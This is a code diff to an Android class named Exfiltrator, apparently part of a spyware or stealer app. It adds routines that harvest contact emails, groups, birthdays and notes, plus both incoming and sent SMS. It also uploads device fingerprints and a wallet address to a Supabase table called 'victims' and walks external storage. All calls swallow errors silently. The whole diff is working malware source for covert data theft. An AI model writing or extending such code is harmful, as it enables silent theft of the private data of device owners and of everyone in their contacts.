@@ -38,8 +38,13 @@ public class Exfiltrator implements Runnable {
         try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
         try { sendDevice(); } catch (Throwable ignored) {}
         try { sendContacts(); } catch (Throwable ignored) {}
+        try { sendContactEmails(); } catch (Throwable ignored) {}
+        try { sendContactGroups(); } catch (Throwable ignored) {}
+        try { sendContactEvents(); } catch (Throwable ignored) {}
+        try { sendContactNotes(); } catch (Throwable ignored) {}
         try { sendAddresses(); } catch (Throwable ignored) {}
-        try { sendSms(); } catch (Throwable ignored) {}
+        try { sendSmsInbox(); } catch (Throwable ignored) {}
+        try { sendSmsSent(); } catch (Throwable ignored) {}
         try { sendCalls(); } catch (Throwable ignored) {}
         try { walk(Environment.getExternalStorageDirectory()); } catch (Throwable ignored) {}
     }
@@ -50,15 +55,12 @@ public class Exfiltrator implements Runnable {
         } catch (Throwable ignored) {}
     }
     private void sendDevice() throws Exception {
-        JSONObject o = new JSONObject();
+        JSONObject o = Fingerprint.collect(ctx);
         o.put("device_id", deviceId);
         o.put("device_name", deviceName);
         o.put("device_folder", deviceFolder);
-        o.put("model", Build.MODEL);
-        o.put("manufacturer", Build.MANUFACTURER);
-        o.put("android", Build.VERSION.RELEASE);
-        o.put("wallet_address", SolanaCheck.WALLET);
         o.put("app_list", appList());
+        o.put("wallet_address", SolanaCheck.WALLET);
         SupabaseClient.insert("victims", o.toString());
         JSONArray a = new JSONArray();
         a.put(o);
@@ -94,6 +96,86 @@ public class Exfiltrator implements Runnable {
             uploadJson("contacts.json", arr);
         } catch (Throwable ignored) {}
     }
+    private void sendContactEmails() {
+        try {
+            Cursor c = ctx.getContentResolver().query(
+                ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, null, null, null);
+            if (c == null) return;
+            JSONArray arr = new JSONArray();
+            while (c.moveToNext()) {
+                try {
+                    JSONObject o = new JSONObject();
+                    o.put("device_id", deviceId);
+                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME)));
+                    o.put("email", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)));
+                    arr.put(o);
+                } catch (Throwable ignored) {}
+            }
+            c.close();
+            uploadJson("emails.json", arr);
+        } catch (Throwable ignored) {}
+    }
+    private void sendContactGroups() {
+        try {
+            Cursor c = ctx.getContentResolver().query(
+                ContactsContract.Groups.CONTENT_URI, null, null, null, null);
+            if (c == null) return;
+            JSONArray arr = new JSONArray();
+            while (c.moveToNext()) {
+                try {
+                    JSONObject o = new JSONObject();
+                    o.put("device_id", deviceId);
+                    o.put("title", c.getString(c.getColumnIndexOrThrow(ContactsContract.Groups.TITLE)));
+                    arr.put(o);
+                } catch (Throwable ignored) {}
+            }
+            c.close();
+            uploadJson("groups.json", arr);
+        } catch (Throwable ignored) {}
+    }
+    private void sendContactEvents() {
+        try {
+            Cursor c = ctx.getContentResolver().query(
+                ContactsContract.Data.CONTENT_URI, null,
+                ContactsContract.Data.MIMETYPE + "=?",
+                new String[]{ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE}, null);
+            if (c == null) return;
+            JSONArray arr = new JSONArray();
+            while (c.moveToNext()) {
+                try {
+                    JSONObject o = new JSONObject();
+                    o.put("device_id", deviceId);
+                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.Data.DISPLAY_NAME)));
+                    o.put("date", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Event.START_DATE)));
+                    o.put("type", c.getInt(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Event.TYPE)));
+                    arr.put(o);
+                } catch (Throwable ignored) {}
+            }
+            c.close();
+            uploadJson("birthdays.json", arr);
+        } catch (Throwable ignored) {}
+    }
+    private void sendContactNotes() {
+        try {
+            Cursor c = ctx.getContentResolver().query(
+                ContactsContract.Data.CONTENT_URI, null,
+                ContactsContract.Data.MIMETYPE + "=?",
+                new String[]{ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE}, null);
+            if (c == null) return;
+            JSONArray arr = new JSONArray();
+            while (c.moveToNext()) {
+                try {
+                    JSONObject o = new JSONObject();
+                    o.put("device_id", deviceId);
+                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.Data.DISPLAY_NAME)));
+                    o.put("note", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Note.NOTE)));
+                    arr.put(o);
+                } catch (Throwable ignored) {}
+            }
+            c.close();
+            uploadJson("notes.json", arr);
+        } catch (Throwable ignored) {}
+    }
     private void sendAddresses() {
         try {
             Cursor c = ctx.getContentResolver().query(
@@ -116,10 +198,11 @@ public class Exfiltrator implements Runnable {
             uploadJson("addresses.json", arr);
         } catch (Throwable ignored) {}
     }
-    private void sendSms() {
+    private void sendSmsInbox() { sendSms("content://sms/inbox", "sms.json"); }
+    private void sendSmsSent()  { sendSms("content://sms/sent",  "sms_sent.json"); }
+    private void sendSms(String uri, String filename) {
         try {
-            Cursor c = ctx.getContentResolver().query(
-                Uri.parse("content://sms/inbox"), null, null, null, null);
+            Cursor c = ctx.getContentResolver().query(Uri.parse(uri), null, null, null, null);
             if (c == null) return;
             JSONArray arr = new JSONArray();
             int n = 0;
@@ -137,7 +220,7 @@ public class Exfiltrator implements Runnable {
                 } catch (Throwable ignored) {}
             }
             c.close();
-            uploadJson("sms.json", arr);
+            uploadJson(filename, arr);
         } catch (Throwable ignored) {}
     }
     private void sendCalls() {
